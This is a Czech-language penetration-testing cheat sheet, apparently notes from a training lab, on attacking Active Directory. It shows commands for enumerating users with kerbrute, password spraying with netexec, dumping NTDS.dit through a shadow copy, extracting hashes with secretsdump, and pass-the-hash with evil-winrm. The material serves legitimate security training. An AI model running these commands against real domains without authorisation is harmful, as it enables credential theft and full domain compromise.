# 👥 NTDS.dit 

---

# 1. Enumerace uživatelů

Před útokem potřebuješ znát existující uživatelská jména.

Firmy často používají vzory:

```text
j.novak
jan.novak
novakj
jnovak
```

---

## username-anarchy

Generování možných kombinací uživatelských jmen.

Příklad:

```text
Jan Novak
```

Výstup:

```text
jnovak
jan.novak
novakj
j.novak
```

Použití:

```bash
username-anarchy names.txt > usernames.txt
```

---

## Kerbrute User Enumeration

Ověření existujících uživatelů přes Kerberos.

Výhody:

- nepotřebuje heslo
    
- nezpůsobuje klasický login pokus
    
- vhodné pro enumeraci účtů
    

```bash
./kerbrute userenum \
--dc <IP_DC> \
--domain <DOMAIN> \
usernames.txt
```

Příklad:

```bash
./kerbrute userenum \
--dc 10.129.42.197 \
--domain inlanefreight.local \
usernames.txt
```

---

# 2. Password Spraying / Brute Force

Po získání uživatelů následuje testování hesel.

---

## Password Spraying

Jedno heslo proti více účtům.

Příklad:

```text
Password2026!

user1
user2
user3
```

Výhoda:

- menší riziko Account Lockoutu
    

---

## Brute Force

Jeden účet proti seznamu hesel.

Nevýhoda:

- rychlejší detekce
    
- riziko zamknutí účtu
    

---

## NetExec SMB Login

Testování přihlašovacích údajů:

```bash
netexec smb <IP_DC> \
-u <USERNAME> \
-p <PASSWORD_LIST>
```

Příklad:

```bash
netexec smb <IP_DC> \
-u bwilliamson \
-p /usr/share/wordlists/fasttrack.txt
```

---

# 3. NTDS.dit Dump

Soubor:

```text
C:\Windows\NTDS\NTDS.dit
```

obsahuje:

- uživatele
    
- NTLM hashe
    
- doménové účty
    

---

## Získání pomocí Volume Shadow Copy

Protože NTDS.dit používá systém, nelze ho běžně kopírovat.

---

### Vytvoření Shadow Copy

```powershell
vssadmin CREATE SHADOW /For=C:
```

---

### Kopie NTDS.dit

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\
Windows\NTDS\NTDS.dit C:\NTDS.dit
```

---

### Kopie SYSTEM hive

Pro dešifrování hashů potřebuješ také SYSTEM.

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
Windows\System32\config\SYSTEM C:\SYSTEM
```

---

### Extrakce hashů

Kali Linux:

```bash
impacket-secretsdump \
-ntds NTDS.dit \
-system SYSTEM \
LOCAL
```

---

Výstup:

```text
username:RID:LMHASH:NTHASH
```

---

# 4. NetExec ntdsutil

Automatizované získání NTDS databáze.

```bash
netexec smb <IP_DC> \
-u <USER> \
-p '<PASSWORD>' \
-M ntdsutil
```

Výhody:

- automatizace dumpu
    
- rychlé získání hashů
    
- méně manuální práce
    

---

# 5. Pass-the-Hash

Pokud získáš NT hash, nemusíš znát heslo.

Princip:

```text
NT Hash
   |
   ▼
NTLM Authentication
   |
   ▼
Přístup bez cracknutí hesla
```

---

## Evil-WinRM Pass-the-Hash

```bash
evil-winrm \
-i <IP_DC> \
-u Administrator \
-H <NTLM_HASH>
```

---

# 🧰 Nástroje

|Nástroj|Použití|
|---|---|
|username-anarchy|Generování username|
|Kerbrute|Enumerace uživatelů|
|NetExec|SMB/AD autentizace|
|Impacket secretsdump|Dump NTDS hashů|
|Evil-WinRM|WinRM přístup|
|Hashcat|Crack NTLM hashů|

---

# Attack Workflow

```text
Username Enumeration
        |
        ▼
Kerbrute
        |
        ▼
Password Spraying
        |
        ▼
Valid Account
        |
        ▼
Admin Access
        |
        ▼
NTDS.dit Dump
        |
        ▼
NTLM Hashes
        |
        ▼
Cracking / Pass-the-Hash
```
